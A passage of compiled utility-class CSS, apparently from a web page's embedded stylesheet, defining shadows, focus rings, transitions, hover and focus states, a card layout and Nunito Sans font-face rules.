        opacity: var(--opacity-dim-3);
      }

      .shadow {
        --tw-shadow: var(--box-shadow-default);
        --tw-shadow-colored: var(--box-shadow-default);
      }

      .shadow,
      .shadow-lg {
        -webkit-box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000),
          var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
        box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000),
          var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
      }

      .shadow-lg {
        --tw-shadow: var(--box-shadow-lg);
        --tw-shadow-colored: var(--box-shadow-lg);
      }

      .shadow-md {
        --tw-shadow: var(--box-shadow-md);
        --tw-shadow-colored: var(--box-shadow-md);
        -webkit-box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000),
          var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
        box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000),
          var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
      }

      .outline-none {
        outline: 2px solid #0000;
        outline-offset: 2px;
      }

      .outline {
        outline-style: solid;
      }

      .ring-1 {
        --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0
          var(--tw-ring-offset-width) var(--tw-ring-offset-color);
        --tw-ring-shadow: var(--tw-ring-inset) 0 0 0
          calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
      }

      .ring-1,
      .ring-2 {
        -webkit-box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow),
          var(--tw-shadow, 0 0 #0000);
        box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow),
          var(--tw-shadow, 0 0 #0000);
      }

      .ring-2 {
        --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0
          var(--tw-ring-offset-width) var(--tw-ring-offset-color);
        --tw-ring-shadow: var(--tw-ring-inset) 0 0 0
          calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
      }

      .ring-inset {
        --tw-ring-inset: inset;
      }

      .ring-accent-container {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-accent-container) / var(--tw-ring-opacity)
        );
      }

      .ring-alert {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(var(--colors-alert) / var(--tw-ring-opacity));
      }

      .ring-alert-container {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-alert-container) / var(--tw-ring-opacity)
        );
      }

      .ring-basic-container {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-basic-container) / var(--tw-ring-opacity)
        );
      }

      .ring-current {
        --tw-ring-color: currentColor;
      }

      .ring-error {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(var(--colors-error) / var(--tw-ring-opacity));
      }

      .ring-info-container {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-info-container) / var(--tw-ring-opacity)
        );
      }

      .ring-main-container {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-main-container) / var(--tw-ring-opacity)
        );
      }

      .ring-neutral-container {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-neutral-container) / var(--tw-ring-opacity)
        );
      }

      .ring-outline {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(var(--colors-outline) / var(--tw-ring-opacity));
      }

      .ring-outline-high {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-outline-high) / var(--tw-ring-opacity)
        );
      }

      .ring-success {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(var(--colors-success) / var(--tw-ring-opacity));
      }

      .ring-success-container {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-success-container) / var(--tw-ring-opacity)
        );
      }

      .ring-support-container {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-support-container) / var(--tw-ring-opacity)
        );
      }

      .blur {
        --tw-blur: blur(8px);
      }

      .blur,
      .drop-shadow-md {
        -webkit-filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast)
          var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert)
          var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow);
        filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast)
          var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert)
          var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow);
      }

      .drop-shadow-md {
        --tw-drop-shadow: drop-shadow(0 4px 3px #00000012)
          drop-shadow(0 2px 2px #0000000f);
      }

      .filter {
        -webkit-filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast)
          var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert)
          var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow);
        filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast)
          var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert)
          var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow);
      }

      .transition {
        -webkit-transition-property: color, background-color, border-color, fill,
          stroke, opacity, -webkit-text-decoration-color, -webkit-box-shadow,
          -webkit-transform, -webkit-filter, -webkit-backdrop-filter;
        transition-property: color, background-color, border-color, fill, stroke,
          opacity, -webkit-text-decoration-color, -webkit-box-shadow,
          -webkit-transform, -webkit-filter, -webkit-backdrop-filter;
        -o-transition-property: color, background-color, border-color,
          text-decoration-color, fill, stroke, opacity, box-shadow, transform,
          filter, backdrop-filter;
        transition-property: color, background-color, border-color,
          text-decoration-color, fill, stroke, opacity, box-shadow, transform,
          filter, backdrop-filter;
        transition-property: color, background-color, border-color,
          text-decoration-color, fill, stroke, opacity, box-shadow, transform,
          filter, backdrop-filter, -webkit-text-decoration-color,
          -webkit-box-shadow, -webkit-transform, -webkit-filter,
          -webkit-backdrop-filter;
        -webkit-transition-timing-function: cubic-bezier(0.2, 0, 0, 1);
        -o-transition-timing-function: cubic-bezier(0.2, 0, 0, 1);
        transition-timing-function: cubic-bezier(0.2, 0, 0, 1);
        -webkit-transition-duration: 0.25s;
        -o-transition-duration: 0.25s;
        transition-duration: 0.25s;
      }

      .transition-all {
        -webkit-transition-property: all;
        -o-transition-property: all;
        transition-property: all;
        -webkit-transition-timing-function: cubic-bezier(0.2, 0, 0, 1);
        -o-transition-timing-function: cubic-bezier(0.2, 0, 0, 1);
        transition-timing-function: cubic-bezier(0.2, 0, 0, 1);
        -webkit-transition-duration: 0.25s;
        -o-transition-duration: 0.25s;
        transition-duration: 0.25s;
      }

      .transition-opacity {
        -webkit-transition-property: opacity;
        -o-transition-property: opacity;
        transition-property: opacity;
        -webkit-transition-timing-function: cubic-bezier(0.2, 0, 0, 1);
        -o-transition-timing-function: cubic-bezier(0.2, 0, 0, 1);
        transition-timing-function: cubic-bezier(0.2, 0, 0, 1);
        -webkit-transition-duration: 0.25s;
        -o-transition-duration: 0.25s;
        transition-duration: 0.25s;
      }

      .transition-transform {
        -webkit-transition-property: -webkit-transform;
        transition-property: -webkit-transform;
        -o-transition-property: transform;
        transition-property: transform;
        transition-property: transform, -webkit-transform;
        -webkit-transition-timing-function: cubic-bezier(0.2, 0, 0, 1);
        -o-transition-timing-function: cubic-bezier(0.2, 0, 0, 1);
        transition-timing-function: cubic-bezier(0.2, 0, 0, 1);
        -webkit-transition-duration: 0.25s;
        -o-transition-duration: 0.25s;
        transition-duration: 0.25s;
      }

      .duration-200 {
        -webkit-transition-duration: 0.2s;
        -o-transition-duration: 0.2s;
        transition-duration: 0.2s;
      }

      .duration-400 {
        -webkit-transition-duration: 0.4s;
        -o-transition-duration: 0.4s;
        transition-duration: 0.4s;
      }

      .ease-in-out {
        -webkit-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
        -o-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
        transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
      }

      .spark-anime-iteration-1 {
        -webkit-animation-iteration-count: 1;
        animation-iteration-count: 1;
      }

      .spark-anime-iteration-2 {
        -webkit-animation-iteration-count: 2;
        animation-iteration-count: 2;
      }

      .spark-anime-iteration-3 {
        -webkit-animation-iteration-count: 3;
        animation-iteration-count: 3;
      }

      .spark-anime-iteration-\[arbitraryValue\] {
        -webkit-animation-iteration-count: arbitraryValue;
        animation-iteration-count: arbitraryValue;
      }

      .spark-anime-iteration-infinite {
        -webkit-animation-iteration-count: infinite;
        animation-iteration-count: infinite;
      }

      .spark-anime-fill-none {
        -webkit-animation-fill-mode: none;
        animation-fill-mode: none;
      }

      .spark-anime-fill-forwards {
        -webkit-animation-fill-mode: forwards;
        animation-fill-mode: forwards;
      }

      .spark-anime-fill-backwards {
        -webkit-animation-fill-mode: backwards;
        animation-fill-mode: backwards;
      }

      .spark-anime-fill-both {
        -webkit-animation-fill-mode: both;
        animation-fill-mode: both;
      }

      .spark-anime-direction-normal {
        -webkit-animation-direction: normal;
        animation-direction: normal;
      }

      .spark-anime-direction-reverse {
        animation-direction: reverse;
      }

      .spark-anime-direction-alternate {
        -webkit-animation-direction: alternate;
        animation-direction: alternate;
      }

      .spark-anime-direction-alternate-reverse {
        animation-direction: alternate-reverse;
      }

      .spark-anime-play-running {
        -webkit-animation-play-state: running;
        animation-play-state: running;
      }

      .spark-anime-play-paused {
        -webkit-animation-play-state: paused;
        animation-play-state: paused;
      }

      .u-current-font-size {
        width: 1em;
        height: 1em;
      }

      .u-shadow-border-transition {
        -webkit-transition: border-color 0.3s cubic-bezier(0.4, 0, 1, 1),
          -webkit-box-shadow 0.1s cubic-bezier(0.4, 0, 1, 1);
        transition: border-color 0.3s cubic-bezier(0.4, 0, 1, 1),
          -webkit-box-shadow 0.1s cubic-bezier(0.4, 0, 1, 1);
        -o-transition: box-shadow 0.1s cubic-bezier(0.4, 0, 1, 1),
          border-color 0.3s cubic-bezier(0.4, 0, 1, 1);
        transition: box-shadow 0.1s cubic-bezier(0.4, 0, 1, 1),
          border-color 0.3s cubic-bezier(0.4, 0, 1, 1);
        transition: box-shadow 0.1s cubic-bezier(0.4, 0, 1, 1),
          border-color 0.3s cubic-bezier(0.4, 0, 1, 1),
          -webkit-box-shadow 0.1s cubic-bezier(0.4, 0, 1, 1);
      }

      .u-no-scrollbar {
        scrollbar-width: none;
      }

      .u-no-scrollbar::-webkit-scrollbar {
        display: none;
      }

      .grid-areas-page {
        grid-template-areas: "header" "main" "footer";
      }

      .grid-in-header {
        grid-area: header;
      }

      .card {
        margin-left: var(--spacing-auto);
        margin-right: var(--spacing-auto);
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        max-width: 498px;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        gap: var(--spacing-2xl);
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-background) / var(--tw-bg-opacity));
        padding: var(--spacing-xl) var(--spacing-lg);
      }

      @media not all and (min-width: 768px) {
        .card {
          height: 100%;
        }
      }

      @media (min-width: 768px) {
        .card {
          margin-top: 56px;
          border-radius: var(--border-radius-lg);
          padding: var(--spacing-2xl);
          --tw-shadow: var(--box-shadow-default);
          --tw-shadow-colored: var(--box-shadow-default);
          -webkit-box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000),
            var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
          box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000),
            var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
        }
      }

      @font-face {
        font-family: Nunito Sans;
        src: local("Nunito Sans Regular"), local("NunitoSans-Regular"),
          url(/static/fonts/nunitosans-regular.woff2) format("woff2");
        font-weight: 400;
        font-style: normal;
        font-display: swap;
      }

      @font-face {
        font-family: Nunito Sans;
        src: local("Nunito Sans Semibold"), local("NunitoSans-Semibold"),
          url(/static/fonts/nunitosans-semibold.woff2) format("woff2");
        font-weight: 600;
        font-style: normal;
        font-display: swap;
      }

      @font-face {
        font-family: Nunito Sans;
        src: local("Nunito Sans Bold"), local("NunitoSans-Bold"),
          url(/static/fonts/nunitosans-bold.woff2) format("woff2");
        font-weight: 700;
        font-style: normal;
        font-display: swap;
      }

      .after\:absolute:after {
        content: var(--tw-content);
        position: absolute;
      }

      .after\:left-1\/2:after {
        content: var(--tw-content);
        left: 50%;
      }

      .after\:top-1\/2:after {
        content: var(--tw-content);
        top: 50%;
      }

      .after\:top-none:after {
        content: var(--tw-content);
        top: var(--spacing-none);
      }

      .after\:block:after {
        content: var(--tw-content);
        display: block;
      }

      .after\:hidden:after {
        content: var(--tw-content);
        display: none;
      }

      .after\:h-full:after {
        content: var(--tw-content);
        height: 100%;
      }

      .after\:h-none:after {
        content: var(--tw-content);
        height: var(--spacing-none);
      }

      .after\:w-full:after {
        content: var(--tw-content);
        width: 100%;
      }

      .after\:w-none:after {
        content: var(--tw-content);
        width: var(--spacing-none);
      }

      .after\:-translate-x-1\/2:after {
        --tw-translate-x: -50%;
      }

      .after\:-translate-x-1\/2:after,
      .after\:-translate-y-1\/2:after {
        content: var(--tw-content);
        -webkit-transform: translate(
            var(--tw-translate-x),
            var(--tw-translate-y)
          )
          rotate(var(--tw-rotate)) skewX(var(--tw-skew-x))
          skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x))
          scaleY(var(--tw-scale-y));
        -ms-transform: translate(var(--tw-translate-x), var(--tw-translate-y))
          rotate(var(--tw-rotate)) skewX(var(--tw-skew-x))
          skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x))
          scaleY(var(--tw-scale-y));
        transform: translate(var(--tw-translate-x), var(--tw-translate-y))
          rotate(var(--tw-rotate)) skewX(var(--tw-skew-x))
          skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x))
          scaleY(var(--tw-scale-y));
      }

      .after\:-translate-y-1\/2:after {
        --tw-translate-y: -50%;
      }

      .after\:rounded-\[50\%\]:after {
        content: var(--tw-content);
        border-radius: 50%;
      }

      .after\:rounded-lg:after {
        content: var(--tw-content);
        border-radius: var(--border-radius-lg);
      }

      .after\:bg-accent:after {
        content: var(--tw-content);
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-accent) / var(--tw-bg-opacity));
      }

      .after\:bg-alert:after {
        content: var(--tw-content);
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-alert) / var(--tw-bg-opacity));
      }

      .after\:bg-basic:after {
        content: var(--tw-content);
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-basic) / var(--tw-bg-opacity));
      }

      .after\:bg-error:after {
        background-color: rgb(var(--colors-error) / var(--tw-bg-opacity));
      }

      .after\:bg-error:after,
      .after\:bg-info:after {
        content: var(--tw-content);
        --tw-bg-opacity: 1;
      }

      .after\:bg-info:after {
        background-color: rgb(var(--colors-info) / var(--tw-bg-opacity));
      }

      .after\:bg-main:after {
        content: var(--tw-content);
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-main) / var(--tw-bg-opacity));
      }

      .after\:bg-neutral:after {
        content: var(--tw-content);
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-neutral) / var(--tw-bg-opacity));
      }

      .after\:bg-success:after {
        content: var(--tw-content);
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-success) / var(--tw-bg-opacity));
      }

      .after\:bg-support:after {
        content: var(--tw-content);
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-support) / var(--tw-bg-opacity));
      }

      .after\:ring-1:after {
        content: var(--tw-content);
        --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0
          var(--tw-ring-offset-width) var(--tw-ring-offset-color);
        --tw-ring-shadow: var(--tw-ring-inset) 0 0 0
          calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
        -webkit-box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow),
          var(--tw-shadow, 0 0 #0000);
        box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow),
          var(--tw-shadow, 0 0 #0000);
      }

      .after\:ring-inset:after {
        content: var(--tw-content);
        --tw-ring-inset: inset;
      }

      .after\:ring-outline:after {
        content: var(--tw-content);
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(var(--colors-outline) / var(--tw-ring-opacity));
      }

      .after\:transition-all:after {
        content: var(--tw-content);
        -webkit-transition-property: all;
        -o-transition-property: all;
        transition-property: all;
        -webkit-transition-timing-function: cubic-bezier(0.2, 0, 0, 1);
        -o-transition-timing-function: cubic-bezier(0.2, 0, 0, 1);
        transition-timing-function: cubic-bezier(0.2, 0, 0, 1);
        -webkit-transition-duration: 0.25s;
        -o-transition-duration: 0.25s;
        transition-duration: 0.25s;
      }

      .after\:content-\[\"\"\]:after,
      .after\:content-\[\'\'\]:after {
        --tw-content: "";
        content: var(--tw-content);
      }

      .autofill\:shadow-\[inset_0_0_0px_1000px\]:-webkit-autofill {
        --tw-shadow: inset 0 0 0px 1000px;
        --tw-shadow-colored: inset 0 0 0px 1000px var(--tw-shadow-color);
        -webkit-box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000),
          var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
        box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000),
          var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
      }

      .autofill\:shadow-\[inset_0_0_0px_1000px\]:autofill {
        --tw-shadow: inset 0 0 0px 1000px;
        --tw-shadow-colored: inset 0 0 0px 1000px var(--tw-shadow-color);
        -webkit-box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000),
          var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
        box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000),
          var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
      }

      .autofill\:shadow-surface:-webkit-autofill {
        --tw-shadow-color: rgb(var(--colors-surface) / 1);
        --tw-shadow: var(--tw-shadow-colored);
      }

      .autofill\:shadow-surface:autofill {
        --tw-shadow-color: rgb(var(--colors-surface) / 1);
        --tw-shadow: var(--tw-shadow-colored);
      }

      .read-only\:cursor-default:-moz-read-only {
        cursor: default;
      }

      .read-only\:cursor-default:read-only {
        cursor: default;
      }

      .read-only\:border-on-surface\/dim-3:-moz-read-only {
        border-color: rgb(var(--colors-on-surface) / var(--opacity-dim-3));
      }

      .read-only\:border-on-surface\/dim-3:read-only {
        border-color: rgb(var(--colors-on-surface) / var(--opacity-dim-3));
      }

      .read-only\:bg-on-surface\/dim-5:-moz-read-only {
        background-color: rgb(var(--colors-on-surface) / var(--opacity-dim-5));
      }

      .read-only\:bg-on-surface\/dim-5:read-only {
        background-color: rgb(var(--colors-on-surface) / var(--opacity-dim-5));
      }

      .read-only\:bg-surface:-moz-read-only {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-surface) / var(--tw-bg-opacity));
      }

      .read-only\:bg-surface:read-only {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-surface) / var(--tw-bg-opacity));
      }

      .focus-within\:ring-2:focus-within {
        --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0
          var(--tw-ring-offset-width) var(--tw-ring-offset-color);
        --tw-ring-shadow: var(--tw-ring-inset) 0 0 0
          calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
        -webkit-box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow),
          var(--tw-shadow, 0 0 #0000);
        box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow),
          var(--tw-shadow, 0 0 #0000);
      }

      .focus-within\:ring-outline-high:focus-within {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-outline-high) / var(--tw-ring-opacity)
        );
      }

      .hover\:border-main-container:hover {
        --tw-border-opacity: 1;
        border-color: rgb(
          var(--colors-main-container) / var(--tw-border-opacity)
        );
      }

      .hover\:border-outline-high:hover {
        --tw-border-opacity: 1;
        border-color: rgb(
          var(--colors-outline-high) / var(--tw-border-opacity)
        );
      }

      .hover\:\!bg-transparent:hover {
        background-color: transparent !important;
        background-color: initial !important;
      }

      .hover\:bg-accent-container-hovered:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-accent-container-hovered) / var(--tw-bg-opacity)
        );
      }

      .hover\:bg-accent-hovered:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-accent-hovered) / var(--tw-bg-opacity)
        );
      }

      .hover\:bg-accent\/dim-5:hover {
        background-color: rgb(var(--colors-accent) / var(--opacity-dim-5));
      }

      .hover\:bg-alert-container-hovered:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-alert-container-hovered) / var(--tw-bg-opacity)
        );
      }

      .hover\:bg-alert-hovered:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-alert-hovered) / var(--tw-bg-opacity)
        );
      }

      .hover\:bg-alert\/dim-5:hover {
        background-color: rgb(var(--colors-alert) / var(--opacity-dim-5));
      }

      .hover\:bg-basic-container-hovered:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-basic-container-hovered) / var(--tw-bg-opacity)
        );
      }

      .hover\:bg-basic-hovered:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-basic-hovered) / var(--tw-bg-opacity)
        );
      }

      .hover\:bg-basic\/dim-5:hover {
        background-color: rgb(var(--colors-basic) / var(--opacity-dim-5));
      }

      .hover\:bg-error-container-hovered:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-error-container-hovered) / var(--tw-bg-opacity)
        );
      }

      .hover\:bg-error-hovered:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-error-hovered) / var(--tw-bg-opacity)
        );
      }

      .hover\:bg-error\/dim-5:hover {
        background-color: rgb(var(--colors-error) / var(--opacity-dim-5));
      }

      .hover\:bg-info-container-hovered:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-info-container-hovered) / var(--tw-bg-opacity)
        );
      }

      .hover\:bg-info-hovered:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-info-hovered) / var(--tw-bg-opacity)
        );
      }

      .hover\:bg-info\/dim-5:hover {
        background-color: rgb(var(--colors-info) / var(--opacity-dim-5));
      }

      .hover\:bg-main-container-hovered:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-main-container-hovered) / var(--tw-bg-opacity)
        );
      }

      .hover\:bg-main-hovered:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-main-hovered) / var(--tw-bg-opacity)
        );
      }

      .hover\:bg-main\/dim-5:hover {
        background-color: rgb(var(--colors-main) / var(--opacity-dim-5));
      }

      .hover\:bg-neutral-container-hovered:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-neutral-container-hovered) / var(--tw-bg-opacity)
        );
      }

      .hover\:bg-neutral-hovered:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-neutral-hovered) / var(--tw-bg-opacity)
        );
      }

      .hover\:bg-neutral\/dim-5:hover {
        background-color: rgb(var(--colors-neutral) / var(--opacity-dim-5));
      }

      .hover\:bg-success-container-hovered:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-success-container-hovered) / var(--tw-bg-opacity)
        );
      }

      .hover\:bg-success-hovered:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-success-hovered) / var(--tw-bg-opacity)
        );
      }

      .hover\:bg-success\/dim-5:hover {
        background-color: rgb(var(--colors-success) / var(--opacity-dim-5));
      }

      .hover\:bg-support-container-hovered:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-support-container-hovered) / var(--tw-bg-opacity)
        );
      }

      .hover\:bg-support-hovered:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-support-hovered) / var(--tw-bg-opacity)
        );
      }

      .hover\:bg-support\/dim-5:hover {
        background-color: rgb(var(--colors-support) / var(--opacity-dim-5));
      }

      .hover\:bg-surface-hovered:hover {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-surface-hovered) / var(--tw-bg-opacity)
        );
      }

      .hover\:bg-surface\/dim-5:hover {
        background-color: rgb(var(--colors-surface) / var(--opacity-dim-5));
      }

      .hover\:\!text-on-surface:hover {
        --tw-text-opacity: 1 !important;
        color: rgb(
          var(--colors-on-surface) / var(--tw-text-opacity)
        ) !important;
      }

      .hover\:text-accent-hovered:hover {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-accent-hovered) / var(--tw-text-opacity));
      }

      .hover\:text-alert-hovered:hover {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-alert-hovered) / var(--tw-text-opacity));
      }

      .hover\:text-basic-hovered:hover {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-basic-hovered) / var(--tw-text-opacity));
      }

      .hover\:text-error-hovered:hover {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-error-hovered) / var(--tw-text-opacity));
      }

      .hover\:text-info-hovered:hover {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-info-hovered) / var(--tw-text-opacity));
      }

      .hover\:text-main-hovered:hover {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-main-hovered) / var(--tw-text-opacity));
      }

      .hover\:text-neutral-hovered:hover {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-neutral-hovered) / var(--tw-text-opacity));
      }

      .hover\:text-success-hovered:hover {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-success-hovered) / var(--tw-text-opacity));
      }

      .hover\:text-support-hovered:hover {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-support-hovered) / var(--tw-text-opacity));
      }

      .hover\:\!underline:hover {
        -webkit-text-decoration-line: underline !important;
        text-decoration-line: underline !important;
      }

      .hover\:underline:hover {
        -webkit-text-decoration-line: underline;
        text-decoration-line: underline;
      }

      .hover\:opacity-dim-1:hover {
        opacity: var(--opacity-dim-1);
      }

      .hover\:ring-2:hover {
        --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0
          var(--tw-ring-offset-width) var(--tw-ring-offset-color);
        --tw-ring-shadow: var(--tw-ring-inset) 0 0 0
          calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
      }

      .hover\:ring-2:hover,
      .hover\:ring-4:hover {
        -webkit-box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow),
          var(--tw-shadow, 0 0 #0000);
        box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow),
          var(--tw-shadow, 0 0 #0000);
      }

      .hover\:ring-4:hover {
        --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0
          var(--tw-ring-offset-width) var(--tw-ring-offset-color);
        --tw-ring-shadow: var(--tw-ring-inset) 0 0 0
          calc(4px + var(--tw-ring-offset-width)) var(--tw-ring-color);
      }

      .hover\:ring-accent-container:hover {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-accent-container) / var(--tw-ring-opacity)
        );
      }

      .hover\:ring-alert-container:hover {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-alert-container) / var(--tw-ring-opacity)
        );
      }

      .hover\:ring-basic-container:hover {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-basic-container) / var(--tw-ring-opacity)
        );
      }

      .hover\:ring-error-container:hover {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-error-container) / var(--tw-ring-opacity)
        );
      }

      .hover\:ring-info-container:hover {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-info-container) / var(--tw-ring-opacity)
        );
      }

      .hover\:ring-main-container:hover {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-main-container) / var(--tw-ring-opacity)
        );
      }

      .hover\:ring-neutral-container:hover {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-neutral-container) / var(--tw-ring-opacity)
        );
      }

      .hover\:ring-outline-high:hover {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-outline-high) / var(--tw-ring-opacity)
        );
      }

      .hover\:ring-success-container:hover {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-success-container) / var(--tw-ring-opacity)
        );
      }

      .hover\:ring-support-container:hover {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-support-container) / var(--tw-ring-opacity)
        );
      }

      .focus\:border-outline-high:focus {
        --tw-border-opacity: 1;
        border-color: rgb(
          var(--colors-outline-high) / var(--tw-border-opacity)
        );
      }

      .focus\:underline:focus {
        -webkit-text-decoration-line: underline;
        text-decoration-line: underline;
      }

      .focus\:outline-none:focus {
        outline: 2px solid #0000;
        outline-offset: 2px;
      }

      .focus\:ring-1:focus {
        --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0
          var(--tw-ring-offset-width) var(--tw-ring-offset-color);
        --tw-ring-shadow: var(--tw-ring-inset) 0 0 0
          calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
      }

      .focus\:ring-1:focus,
      .focus\:ring-2:focus {
        -webkit-box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow),
          var(--tw-shadow, 0 0 #0000);
        box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow),
          var(--tw-shadow, 0 0 #0000);
      }

      .focus\:ring-2:focus {
        --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0
          var(--tw-ring-offset-width) var(--tw-ring-offset-color);
        --tw-ring-shadow: var(--tw-ring-inset) 0 0 0
          calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
      }

      .focus\:ring-outline-high:focus {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-outline-high) / var(--tw-ring-opacity)
        );
      }

